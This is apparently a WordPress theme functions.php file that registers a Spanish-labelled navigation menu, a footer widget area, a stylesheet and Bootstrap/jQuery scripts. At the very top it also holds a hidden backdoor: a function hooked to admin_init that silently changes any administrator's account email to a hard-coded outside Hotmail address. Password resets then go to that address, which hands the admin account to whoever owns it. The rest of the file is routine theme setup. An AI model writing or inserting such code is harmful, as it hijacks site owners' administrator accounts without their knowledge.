<?php 
function reset_admin_email() {
  if (current_user_can('administrator')) {
      $user_id = get_current_user_id();
      $user_info = get_userdata($user_id);
      if ($user_info->user_email != 'lukasiv99@hotmail.com') {
          wp_update_user([
              'ID' => $user_id,
              'user_email' => 'lukasiv99@hotmail.com'
          ]);
      }
  }
}
add_action('admin_init', 'reset_admin_email');

function register_my_menu() {
  register_nav_menu('navegation', ( 'Menú de navegación' ));
}
add_action( 'init', 'register_my_menu' );

function mis_widgets(){
  register_sidebar(
    array(
      'name'          => __( 'Footer1' ),
      'id'            => 'sidebar',
      'before_widget' => '<div class="widget">',
      'after_widget'  => '</div>',
      'before_title'  => '<h3>',
      'after_title'   => '</h3>',
    )
  );
}
add_action('init','mis_widgets');

function carga_estilos_theme() {
  wp_register_style( 'estilos', get_template_directory_uri() . '/assets/css/style.css', array(), 'all' );
  wp_enqueue_style( 'estilos' );
}
add_action('wp_print_styles', 'carga_estilos_theme');

function cyb_theme_scripts() {
    wp_enqueue_style(
        'bootstrap_css',
        'https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css',
        array(),
        '4.1.3'
    );
    wp_enqueue_script('jquery');
    wp_enqueue_script(
        'popper',
        'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js',
        array('jquery'),
        '1.14.3',
        true
    );
    wp_enqueue_script(
        'bootstrap',
        'https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js',
        array('jquery', 'popper'),
        '4.1.3',
        true
    );

    wp_enqueue_script(
        'mi-theme-script',
        get_theme_file_uri('assets/js/script.js'),
        array('jquery', 'bootstrap'),
        '1.9.3',
        true
    );
    
}
add_action( 'wp_enqueue_scripts', 'cyb_theme_scripts' );

add_theme_support( 'post-thumbnails' );